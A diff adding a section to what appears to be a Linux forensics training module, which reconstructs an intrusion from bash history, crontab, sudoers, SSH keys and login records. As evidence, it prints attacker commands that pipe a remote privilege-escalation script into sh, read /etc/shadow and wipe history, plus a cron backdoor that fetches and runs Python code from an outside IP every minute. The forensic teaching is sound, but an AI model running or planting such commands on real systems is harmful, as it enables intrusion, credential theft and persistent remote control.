@@ -2202,3 +2202,465 @@ The memory file descriptor, [memfd](https://man7.org/linux/man-pages/man2/memfd_
 
 Live processes executed from `memfd` can be identified on an up-and-running workload by inspecting the symbolic link of `/proc/<pid>/exe`, which begins with the `/memfd:` prefix.
 
+### Bash History and Crontab
+
+Bash history keeps a log of commands you've typed into the shell. This log helps to navigate previous actions quickly using arrow keys or commands like `history`, and it's stored both in memory and on disk. From a security standpoint, this persistence is a double-edged sword. On the one hand, it's great for auditing user activity, but it can be risky if the history file contains confidential or critical data.
+
+#### In-Memory Storage
+
+During an active Bash session, commands are held in RAM. This allows instant access via up/down arrows or for reverse search. The in-memory list is limited by the `HISTSIZE` environment variable, which often holds 500 or 1000 commands by default.
+
+#### On-Disk Storage
+
+When you exit the shell, the session's history is appended to the `~/.bash_history` file, which is typically stored in the home directory of the corresponding user. Its file size is controlled by `HISTFILESIZE` and ensures that older commands are overwritten if the limit is exceeded.
+
+#### Bash History Config
+
+Bash history can be configured either in the `~/.bashrc` or in the `/etc/bash.bashrc` by setting the following environment variables:
+
+| **Variable**                               | **Description**                                                      |
+| ------------------------------------------ | -------------------------------------------------------------------- |
+| `export HISTSIZE=1000`                     | In-memory limit: 1000 commands per session                           |
+| `export HISTFILESIZE=2000`                 | On-disk limit: 2000 lines in `~/.bash_history`                       |
+| `export HISTCONTROL=ignoreboth`            | Ignore duplicates and commands starting with space                   |
+| `export HISTIGNORE="ls:cd:pwd:exit:clear"` | Ignore common non-sensitive commands                                 |
+| `export HISTTIMEFORMAT="%F %T "`           | Timestamp format before the command: `YYYY-MM-DD HH:MM:SS <command>` |
+| `export HISTFILE=~/.secure_history`        | Custom path. The file must be created first if it doesn't exist.     |
+
+#### Bash History Review
+
+You can utilize the `linux.bash.Bash` plugin to extract the bash history from the memory dump:
+
+```bash
+linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.bash.Bash
+
+Volatility 3 Framework 2.5.2
+
+PID     Process CommandTime     Command
+
+1282    bash    2023-10-15 17:34:47.000000      history
+1282    bash    2023-10-15 17:34:47.000000       ls
+1282    bash    2023-10-15 17:34:47.000000      sudo reboot
+1282    bash    2023-10-15 17:34:47.000000      rm -rf ~/.bash_history
+1282    bash    2023-10-15 18:39:49.000000      sudo mkdir /media/USB
+1282    bash    2023-10-15 18:40:25.000000      df -h
+1282    bash    2023-10-15 18:44:59.000000      sudo mount -t ext4 /dev/sdb /media/USB -o uid=1000
+1282    bash    2023-10-15 18:45:31.000000      sudo lsblk
+1282    bash    2023-10-15 18:49:29.000000      sudo fdisk -l
+1282    bash    2023-10-15 18:49:47.000000      sudo mount -t ext4 /dev/sdb1 /media/USB -o uid=1000
+1282    bash    2023-10-15 18:50:34.000000      sudo mount -t ext4 /dev/sdb1 /media/USB -o uid=1000,gid=1000
+1282    bash    2023-10-15 18:51:13.000000      mount /dev/sdb1 /media/USB/
+1282    bash    2023-10-15 18:51:16.000000      sudo mount /dev/sdb1 /media/USB/
+1282    bash    2023-10-15 18:51:40.000000      ls -la
+1282    bash    2023-10-15 18:51:56.000000      ./avml web-server-dump
+28645   bash    2023-10-15 18:48:25.000000      curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+28645   bash    2023-10-15 18:48:25.000000      exit
+28645   bash    2023-10-15 18:48:25.000000      �5~�EV
+28645   bash    2023-10-15 18:48:25.000000      sudo fdisk -l
+28645   bash    2023-10-15 18:48:25.000000      cd /tmp
+28645   bash    2023-10-15 18:48:25.000000      find / -perm -u=s -type f 2>/dev/null
+28645   bash    2023-10-15 18:48:25.000000      sudo mkdir /media/USB
+28645   bash    2023-10-15 18:48:25.000000      vim /etc/sudoers
+28645   bash    2023-10-15 18:48:25.000000      sudo bash
+28645   bash    2023-10-15 18:48:25.000000      sudo bash
+28645   bash    2023-10-15 18:48:25.000000      sudo mount -t ext4 /dev/sdb1 /media/USB -o uid=1000
+28645   bash    2023-10-15 18:48:25.000000      history
+28645   bash    2023-10-15 18:48:25.000000      ��UH��HH��t�z���H��]�q������U1����������]�����f.�
+28645   bash    2023-10-15 18:48:25.000000      ����������������
+28645   bash    2023-10-15 18:48:25.000000      ��AWAVAUATUSH�H��T
+28645   bash    2023-10-15 18:48:25.000000      ls -la
+28645   bash    2023-10-15 18:48:25.000000      whoami
+28645   bash    2023-10-15 18:48:25.000000      cd ~
+28645   bash    2023-10-15 18:48:25.000000      sudo lsblk
+28645   bash    2023-10-15 18:48:25.000000      sudo lsblk
+28645   bash    2023-10-15 18:48:25.000000      sudo mount -t ext4 /dev/sdb /media/USB -o uid=1000
+28645   bash    2023-10-15 18:48:25.000000      ��H���
+28645   bash    2023-10-15 18:48:25.000000      ls -la
+28645   bash    2023-10-15 18:48:25.000000      sudo reboot
+28645   bash    2023-10-15 18:48:25.000000      ls
+28645   bash    2023-10-15 18:48:25.000000      df -h
+28645   bash    2023-10-15 18:48:25.000000      cat /etc/passwd
+28645   bash    2023-10-15 18:48:25.000000      ls -la
+28645   bash    2023-10-15 18:48:25.000000       ls
+28645   bash    2023-10-15 18:48:25.000000      cat flag.txt
+28645   bash    2023-10-15 18:48:25.000000      pwd
+28645   bash    2023-10-15 18:48:25.000000      rm flag.txt
+28645   bash    2023-10-15 18:48:25.000000      sudo lsblk
+28645   bash    2023-10-15 18:48:25.000000      /etc/bash_completion.d/apport_completion
+28645   bash    2023-10-15 18:48:25.000000      sudo fdisk -l | less
+28645   bash    2023-10-15 18:48:25.000000      rm -rf ~/.bash_history
+28645   bash    2023-10-15 18:48:25.000000      cat /etc/shadow
+28645   bash    2023-10-15 18:48:25.000000      sudo fdisk -l | less
+28645   bash    2023-10-15 18:48:25.000000      sudo cat /etc/shadow
+```
+
+From the bash history extracted from the memory dump, it's evident that the entries at 18:45:25 include suspicious and malicious actions.
+
+Filtering by time:
+
+```bash
+linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.bash.Bash | grep "18:48:25"
+
+28645   bash    2023-10-15 18:48:25.000000      curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+28645   bash    2023-10-15 18:48:25.000000      exit
+28645   bash    2023-10-15 18:48:25.000000      �5~�EV
+28645   bash    2023-10-15 18:48:25.000000      sudo fdisk -l
+28645   bash    2023-10-15 18:48:25.000000      cd /tmp
+28645   bash    2023-10-15 18:48:25.000000      find / -perm -u=s -type f 2>/dev/null
+28645   bash    2023-10-15 18:48:25.000000      sudo mkdir /media/USB
+28645   bash    2023-10-15 18:48:25.000000      vim /etc/sudoers
+28645   bash    2023-10-15 18:48:25.000000      sudo bash
+28645   bash    2023-10-15 18:48:25.000000      sudo bash
+28645   bash    2023-10-15 18:48:25.000000      sudo mount -t ext4 /dev/sdb1 /media/USB -o uid=1000
+28645   bash    2023-10-15 18:48:25.000000      history
+28645   bash    2023-10-15 18:48:25.000000      ��UH��HH��t�z���H��]�q������U1����������]�����f.�
+28645   bash    2023-10-15 18:48:25.000000      ����������������
+28645   bash    2023-10-15 18:48:25.000000      ��AWAVAUATUSH�H��T
+28645   bash    2023-10-15 18:48:25.000000      ls -la
+28645   bash    2023-10-15 18:48:25.000000      whoami
+28645   bash    2023-10-15 18:48:25.000000      cd ~
+28645   bash    2023-10-15 18:48:25.000000      sudo lsblk
+28645   bash    2023-10-15 18:48:25.000000      sudo lsblk
+28645   bash    2023-10-15 18:48:25.000000      sudo mount -t ext4 /dev/sdb /media/USB -o uid=1000
+28645   bash    2023-10-15 18:48:25.000000      ��H���
+28645   bash    2023-10-15 18:48:25.000000      ls -la
+28645   bash    2023-10-15 18:48:25.000000      sudo reboot
+28645   bash    2023-10-15 18:48:25.000000      ls
+28645   bash    2023-10-15 18:48:25.000000      df -h
+28645   bash    2023-10-15 18:48:25.000000      cat /etc/passwd
+28645   bash    2023-10-15 18:48:25.000000      ls -la
+28645   bash    2023-10-15 18:48:25.000000       ls
+28645   bash    2023-10-15 18:48:25.000000      cat flag.txt
+28645   bash    2023-10-15 18:48:25.000000      pwd
+28645   bash    2023-10-15 18:48:25.000000      rm flag.txt
+28645   bash    2023-10-15 18:48:25.000000      sudo lsblk
+28645   bash    2023-10-15 18:48:25.000000      /etc/bash_completion.d/apport_completion
+28645   bash    2023-10-15 18:48:25.000000      sudo fdisk -l | less
+28645   bash    2023-10-15 18:48:25.000000      rm -rf ~/.bash_history
+28645   bash    2023-10-15 18:48:25.000000      cat /etc/shadow
+28645   bash    2023-10-15 18:48:25.000000      sudo fdisk -l | less
+28645   bash    2023-10-15 18:48:25.000000      sudo cat /etc/shadow
+```
+
+Interesting commands executed:
+
+|**Command**|**Description**|
+|---|---|
+|`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| sh`|Linpeas bash script executed in memory. This script is used to find privilege escalation options|
+|`find / -perm -u=s -type f 2>/dev/null`|Find command locates binaries having SUID permission that can be used for privilege escalation|
+|`vim /etc/sudoers`|`vim` used to read/modify `/etc/sudoers`|
+|`sudo bash`|`bash` executed with root privileges|
+|`whoami`|`whoami` to get username|
+|`cat /etc/passwd`|Get content of `/etc/passwd` (users) file (not used in this module)|
+|`cat flag.txt`|Get content of `flag.txt` (not used in this module)|
+|`rm flag.txt`|Delete `flag.txt`|
+|`rm -rf ~/.bash_history`|Forcefully delete `.bash_history` file|
+|`cat /etc/shadow`|Get content of `/etc/shadow` file that stores the hashed passwords|
+|`sudo cat /etc/shadow`|The same command used with `sudo`|
+
+Bash history content can also be found in `Linux.Sys.BashHistory.json` file:
+
+```bash
+linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/results/Linux.Sys.BashHistory.json
+
+{"Line":"echo \"*/1 * * * * /usr/bin/run-one /usr/bin/python3 -c 'import requests, subprocess; loader=requests.get(\\\"http://18.117.8.128:8000/chattingloosened\\\"); subprocess.run(\\\"/usr/bin/python3\\\", input=loader.content)'\" | crontab -","OSPath":"/home/john/.bash_history"}
+{"Line":"ps aux | grep -i python3","OSPath":"/home/john/.bash_history"}
+{"Line":"exit","OSPath":"/home/john/.bash_history"}
+{"Line":"rm -rf ~/.bash_history ","OSPath":"/home/user/.bash_history"}
+{"Line":"history","OSPath":"/home/user/.bash_history"}
+{"Line":" ls","OSPath":"/home/user/.bash_history"}
+{"Line":"ls -la","OSPath":"/home/user/.bash_history"}
+{"Line":"sudo reboot","OSPath":"/home/user/.bash_history"}
+{"Line":"whoami","OSPath":"/home/user/.bash_history"}
+{"Line":"ls ","OSPath":"/home/user/.bash_history"}
+{"Line":"ls -la","OSPath":"/home/user/.bash_history"}
+{"Line":"pwd","OSPath":"/home/user/.bash_history"}
+{"Line":"cd ~","OSPath":"/home/user/.bash_history"}
+{"Line":"ls -la","OSPath":"/home/user/.bash_history"}
+{"Line":"cat flag.txt","OSPath":"/home/user/.bash_history"}
+{"Line":"rm flag.txt","OSPath":"/home/user/.bash_history"}
+{"Line":"cat /etc/passwd","OSPath":"/home/user/.bash_history"}
+{"Line":"cat /etc/shadow","OSPath":"/home/user/.bash_history"}
+{"Line":"sudo cat /etc/shadow","OSPath":"/home/user/.bash_history"}
+{"Line":"cd /tmp","OSPath":"/home/user/.bash_history"}
+{"Line":"curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh","OSPath":"/home/user/.bash_history"}
+{"Line":"sudo bash","OSPath":"/home/user/.bash_history"}
+<SNIP>
+```
+
+The commands that are particularly noteworthy and have not been reviewed yet, or those that can provide you with additional context:
+
+|**Command**|**Description**|
+|---|---|
+|`echo \"*/1 * * * * /usr/bin/run-one /usr/bin/python3 -c 'import requests, subprocess; loader=requests.get(\\\"http://18.117.8.128:8000/chattingloosened\\\"); subprocess.run(\\\"/usr/bin/python3\\\", input=loader.content)'\" \| crontab -`|Crontab is created to be executed every minute. Interesting is that it was executed as john user: `"OSPath":"/home/john/.bash_history"`|
+|`ps aux \| grep -i python3`|List python3 processes, also executed by `john` user|
+|`sudo cat /etc/shadow`|Get content /etc/shadow executed by user "`user`"|
+|`vim /etc/sudoers`|Read/modify /etc/sudoers by user "`user`"|
+|`sudo bash`|Bash executed as sudo by user "`user`"|
+
+#### Crontab
+
+Since you've observed multiple instances of crontab usage, it's time to examine the crontab file:
+
+```bash
+linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/results/Linux.Sys.Crontab%2FCronTabs.json
+
+{"Event":null,"User":"root","Minute":"17","Hour":"*","DayOfMonth":"*","Month":"*","DayOfWeek":"*","Command":"cd / \u0026\u0026 run-parts --report /etc/cron.hourly","Path":"/etc/crontab"}
+{"Event":null,"User":"root","Minute":"25","Hour":"6","DayOfMonth":"*","Month":"*","DayOfWeek":"*","Command":"test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.daily )","Path":"/etc/crontab"}
+{"Event":null,"User":"root","Minute":"47","Hour":"6","DayOfMonth":"*","Month":"*","DayOfWeek":"7","Command":"test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.weekly )","Path":"/etc/crontab"}
+{"Event":null,"User":"root","Minute":"52","Hour":"6","DayOfMonth":"1","Month":"*","DayOfWeek":"*","Command":"test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.monthly )","Path":"/etc/crontab"}
+{"Event":null,"User":"root","Minute":"30","Hour":"3","DayOfMonth":"*","Month":"*","DayOfWeek":"0","Command":"test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron","Path":"/etc/cron.d/e2scrub_all"}
+{"Event":null,"User":"root","Minute":"10","Hour":"3","DayOfMonth":"*","Month":"*","DayOfWeek":"*","Command":"test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r","Path":"/etc/cron.d/e2scrub_all"}
+{"Event":null,"User":"/usr/bin/run-one","Minute":"*/1","Hour":"*","DayOfMonth":"*","Month":"*","DayOfWeek":"*","Command":"/usr/bin/python3 -c 'import requests, subprocess; loader=requests.get(\"http://18.117.8.128:8000/chattingloosened\"); subprocess.run(\"/usr/bin/python3\", input=loader.content)'","Path":"/var/spool/cron/crontabs/root"}
+{"Event":null,"User":"/usr/bin/run-one","Minute":"*/1","Hour":"*","DayOfMonth":"*","Month":"*","DayOfWeek":"*","Command":"/usr/bin/python3 -c 'import requests, subprocess; loader=requests.get(\"http://18.117.8.128:8000/chattingloosened\"); subprocess.run(\"/usr/bin/python3\", input=loader.content)'","Path":"/var/spool/cron/crontabs/root"}
+```
+
+Crontab file was modified at 18:35:44:
+
+```bash
+linuxforensics@ubuntu:~$ stat /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/spool/cron/crontabs
+
+File: /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/spool/cron/crontabs
+  Size: 0               Blocks: 0          IO Block: 4096   regular empty file
+Device: 805h/2053d      Inode: 1054033     Links: 1
+Access: (0664/-rw-rw-r--)  Uid: ( 1000/linuxforensics)   Gid: ( 1000/linuxforensics)
+Access: 2023-10-15 18:35:44.000000000 +0000
+Modify: 2023-10-15 18:35:44.000000000 +0000
+Change: 2023-10-23 16:32:10.970221999 +0000
+ Birth: 2023-10-23 16:32:10.970221999 +0000
+```
+
+### File Modifications
+
+Examining file modifications is a critical step for uncovering evidence of unauthorized activity, data tempering, or system compromises. Linux filesystems maintain several key timestamps for each file, often referred to as `MACB times`:
+
+- Modification Time (`mtime`): Records the last time the file's content was changed.
+- Access Time (`atime`): Tracks when the file was last read or accessed.
+- Change Time (`ctime`): Notes changes to the file's metadata, such as permissions or ownership.
+- Birth Time (`btime`): Available on certain filesystems like ext4, indicating when the file was created.
+
+These timestamps, stored in the inode structure, can reveal timelines of events during an investigation. However, there are certain techniques like `timestomping` out there that can make the entire investigation more difficult.
+
+Timestomping is a pretty sneaky anti-forensic trick attackers use to mess with file timestamps, making it harder to piece together what happened during an incident. Basically, it's all about changing those MACB times to either hide tracks or plant false trails. This can throw off timeline analysis big time, like making a malicious file look like it was created way before the breach. So just keep in mind that there are some techniques that can mess with the obvious logic of events you see.
+
+#### Last modified files review
+
+Keeping this possible anti-forensic technique aside, look at the last modified files. Therefore, your next step involves identifying files that were modified during the attack. To achieve this, you can use the find comment:
+
+```bash
+linuxforensics@ubuntu:~$ find /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto -type f -newermt '2023-10-15 18:00:00'
+```
+
+The most interesting files modified during this time:
+
+```
+<SNIP>
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/lastlog
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/wtmp
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/kern.log
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/apt/history.log
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/apt/term.log
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/dpkg.log
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/auth.log
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/journal/894062f9af204645a289e8016977fe6c/user-1000.journal
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/journal/894062f9af204645a289e8016977fe6c/system.journal
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/audit/audit.log
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/audit/audit.log.1
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/lib/dpkg/status
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/spool/cron/crontabs
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/run/utmp
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/run/systemd/transient/snap.lxd.workaround.service
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/run/systemd/generator.late/apport.service
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/run/systemd/system/netplan-ovs-cleanup.service
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/home/john/.ssh/authorized_keys
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/home/user/.lesshst
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/etc/shadow
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/etc/passwd
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/etc/sudoers
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/proc/mounts
+/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/proc/net/arp
+<SNIP>
+```
+
+#### ARP File
+
+```bash
+linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/proc/net/arp
+
+IP address       HW type     Flags       HW address            Mask     Device
+
+192.168.152.2    0x1         0x2         00:50:56:e9:6a:6c     *        ens33
+
+192.168.152.254  0x1         0x2         00:50:56:ec:68:15     *        ens33
+
+192.168.152.180  0x1         0x2         00:0c:29:ca:6f:de     *        ens33
+```
+
+You can utilize this MAC address to determine that the local address attacker system was running a VM using VMWare when you visit the following page: https://hwaddress.com/oui-iab/00-0C-29/
+
+#### `sudoers` File
+
+You observed multiple times that the `/etc/sudoers` file was modified. Check it:
+
+```bash
+linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/etc/sudoers | grep -v "#" | sed '/^\s*$/d'
+
+user ALL=(ALL:ALL) NOPASSWD: ALL
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+Defaults        use_pty
+root    ALL=(ALL:ALL) ALL
+%admin ALL=(ALL) ALL
+%sudo   ALL=(ALL:ALL) ALL
+@includedir /etc/sudoers.d
+```
+
+Here you can see that the line with `user ALL=(ALL:ALL) NOPASSWD: ALL` was added to allow execution using `user` without the need of typing a password.
+
+Using `stat` command, you can check when the `/etc/sudoers` file was modified:
+
+```bash
+linuxforensics@ubuntu:~$ stat /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/etc/sudoers
+
+  File: /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/etc/sudoers
+  Size: 1708            Blocks: 8          IO Block: 4096   regular file
+Device: 805h/2053d      Inode: 1054393     Links: 1
+Access: (0664/-rw-rw-r--)  Uid: ( 1000/linuxforensics)   Gid: ( 1000/linuxforensics)
+Access: 2025-11-03 16:37:14.135871393 +0000
+Modify: 2023-10-15 18:20:50.000000000 +0000
+Change: 2023-10-23 16:32:13.522161661 +0000
+ Birth: 2023-10-23 16:32:13.522161661 +0000
+```
+
+Modification time: `18:20:50`
+
+However, making modifications to the sudoers file is restricted to users with sudo privileges. How did the user modify this file? You have previously observed commands that checked SUID binary attributes and opened the `/etc/suoders` file using the `vim` command.
+
+Velociraptor has collected SUID binary attributes. You can validate your hypothesis by examining the `Linux.Sys.SUID.json` file.
+
+```bash
+linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/results/Linux.Sys.SUID.json | grep "vim"
+
+{"Mode":"urwxr-xr-x","OSPath":"/usr/bin/vim.basic","Size":3783696,"Mtime":"2023-08-18T04:12:26Z","OwnerID":null,"GroupID":null}
+```
+
+The string `urwxr-xr-x` does not clearly indicate the presence of the SUID attribute on a file. The mode `urwxr-xr-x` means that the owner has full read, write, and execute permissions, while the group and others have read and execute permissions but no write permissions. Additionally, the `.viminfo` file hasn't been found for user `user`.
+
+#### History of installed packages
+
+Another file that has to be checked is `history.log`, which contains information about installed packages:
+
+```bash
+linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/apt/history.log
+```
+
+You can find that the `openssh-server` package was installed on the system.
+
+```bash
+Start-Date: 2023-10-15  18:27:27
+
+Commandline: apt-get install openssh-server
+
+Upgrade: openssh-client:amd64 (1:8.9p1-3ubuntu0.3, 1:8.9p1-3ubuntu0.4), openssh-server:amd64 (1:8.9p1-3ubuntu0.3, 1:8.9p1-3ubuntu0.4), openssh-sftp-server:amd64 (1:8.9p1-3ubuntu0.3, 1:8.9p1-3ubuntu0.4)
+
+End-Date: 2023-10-15  18:27:30
+```
+
+#### SSH `authorized_keys` file
+
+An authorized key in SSH is a public key used to facilitate login access for users, and this authentication mechanism is commonly known as public key authentication. Each user typically configures their authorized keys individually, often stored in a file named `.ssh/authorized_keys` located within the user's home directory. This setup allows users to authenticate securely with their public keys instead of relying on traditional password-based authentication.
+
+You can see that SSH `authorized_keys` for `john` was modified.
+
+```bash
+linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/home/john/%2Essh/authorized_keys
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCSIqJ5Kws3ZH3cYkvfFYvDwLxE2QMUfxIouCSSzGd1BemSF/Ht0szYa5l1PxD45BpcHxMt2OTV4SZT9V44tAgyEsbkx+gJb0wj92ew/+cQejHPE/MRCI9TemwPKlskFkBEphwAYXMxxBNv/oi6F5b5j9EkC6OCD4AicX9n6JTuFG4Q0x0KNIpOgXIkqnYKtRvZy0JofDgdGqn2zSuqDDtpNil14qCb4po3hXFsZpNRnSSxKxw0XUj1S078t6hx6oYQDnSSTE6ObpC+W3Fq949+4NWgMXUB6nEU/p4609HDASv9wrCyh0AA8Xzmg7mHFqewZHe+GWKVM+c4H2KlifZvIznh921K/aTS1YfgJKET+0KrF5E/TQ5HK477EMsa6zifVeLRCopY6DDWr5IuHvBViDocn5Eizm5msYHy4VBdHueofyova2xTOwNHO+nFWZPae0qjVRSf2kzfRDQ1tiLy1sfZ6nGC6UyaNYLoOAiS9YaMIgP6FiuC8nR4D1v2uOk= leo@leo-virtual-machine
+```
+
+In the `Linux.Ssh.AuthorizedKeys.json` file:
+
+```bash
+linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/results/Linux.Ssh.AuthorizedKeys.json
+
+{"Uid":"0","User":"john","OSPath":"/home/john/.ssh/authorized_keys","Key":"AAAAB3NzaC1yc2EAAAADAQABAAABgQCSIqJ5Kws3ZH3cYkvfFYvDwLxE2QMUfxIouCSSzGd1BemSF/Ht0szYa5l1PxD45BpcHxMt2OTV4SZT9V44tAgyEsbkx+gJb0wj92ew/+cQejHPE/MRCI9TemwPKlskFkBEphwAYXMxxBNv/oi6F5b5j9EkC6OCD4AicX9n6JTuFG4Q0x0KNIpOgXIkqnYKtRvZy0JofDgdGqn2zSuqDDtpNil14qCb4po3hXFsZpNRnSSxKxw0XUj1S078t6hx6oYQDnSSTE6ObpC+W3Fq949+4NWgMXUB6nEU/p4609HDASv9wrCyh0AA8Xzmg7mHFqewZHe+GWKVM+c4H2KlifZvIznh921K/aTS1YfgJKET+0KrF5E/TQ5HK477EMsa6zifVeLRCopY6DDWr5IuHvBViDocn5Eizm5msYHy4VBdHueofyova2xTOwNHO+nFWZPae0qjVRSf2kzfRDQ1tiLy1sfZ6nGC6UyaNYLoOAiS9YaMIgP6FiuC8nR4D1v2uOk=","Comment":"leo@leo-virtual-machine","Mtime":"2023-10-15T18:32:40Z"}
+```
+
+You can also check root's `.viminfo` file to see when the file was opened for modification:
+
+```bash
+/home/linuxforensics/Desktop/cases/scenario1/root_viminfo
+
+# This viminfo file was generated by Vim 8.2.
+# You may edit it if you're careful!
+# Viminfo version
+|1,4
+# Value of 'encoding' when this file was written
+- encoding=utf-8
+# hlsearch on (H) or off (h):
+~h
+# Command Line History (newest to oldest):
+:wq!
+|2,0,1697394760,,"wq!"
+# Search String History (newest to oldest):
+# Expression History (newest to oldest):
+# Input Line History (newest to oldest):
+# Debug Line History (newest to oldest):
+# Registers:
+# File marks:
+'0  3  0  /home/john/.ssh/authorized_keys
+|4,48,3,0,1697394760,"/home/john/.ssh/authorized_keys"
+# Jumplist (newest first):
+- ' 3 0 /home/john/.ssh/authorized_keys
+|4,39,3,0,1697394760,"/home/john/.ssh/authorized_keys"
+- ' 1 0 /home/john/.ssh/authorized_keys
+|4,39,1,0,1697394750,"/home/john/.ssh/authorized_keys"
+# History of marks within files (newest to oldest):
+> /home/john/.ssh/authorized_keys
+*   1697394760  0
+"   3   0
+^   3   0
+.   2   576
++   2   576
+```
+
+#### SSH login history
+
+You can use `last` binary to read `wtmp` file:
+
+```bash
+linuxforensics@ubuntu:~$ last -f /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/wtmp
+
+john     pts/0        192.168.152.180  Sun Oct 15 18:34 - 18:37  (00:03)
+user     tty1                          Sun Oct 15 17:34    gone - no logout
+reboot   system boot  5.15.0-86-generi Sun Oct 15 17:34   still running
+user     tty1                          Sat Oct 14 19:33 - down   (22:00)
+reboot   system boot  5.15.0-86-generi Sat Oct 14 19:33 - 17:34  (22:00)
+user     tty1                          Thu Oct  5 20:46 - down  (8+22:46)
+reboot   system boot  5.15.0-86-generi Thu Oct  5 20:43 - 19:33 (8+22:49)
+user     tty1                          Wed Oct  4 22:16 - crash  (22:27)
+reboot   system boot  5.15.0-86-generi Wed Oct  4 22:15 - 19:33 (9+21:18)
+
+wtmp begins Wed Oct  4 22:15:12 2023
+```
+
+The same information is stored in the `Linux.Sys.LastUserLogin.json` file collected by Velociraptor:
+
+```json
+{"OSPath":"/var/log/wtmp","Type":"USER_PROCESS","ID":null,"PID":28322,"Host":"192.168.152.180","User":"john","IpAddr":"192.168.152.180","Terminal":"pts/0","login_time":"2023-10-15T18:34:01Z"}
+
+{"OSPath":"/var/log/wtmp","Type":"DEAD_PROCESS","ID":null,"PID":28256,"Host":"","User":"","IpAddr":"0.0.0.0","Terminal":"pts/0","login_time":"2023-10-15T18:37:55Z"}
+```
+
+Given that SSH was installed on the system, you should proceed to examine the SSHD logs found in the `auth.log` file.
+
+```bash
+linuxforensics@ubuntu:~$ grep sshd /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/auth.log
+```
+
+Alternatively, review `Linux.Syslog.SSHLogin.json` file:
+
+```json
+{"Time":"0000-10-15T18:34:00Z","IP":"192.168.152.180","Result":"Accepted","Method":"publickey","AttemptedUser":"john","OSPath":"/var/log/auth.log"}
+```
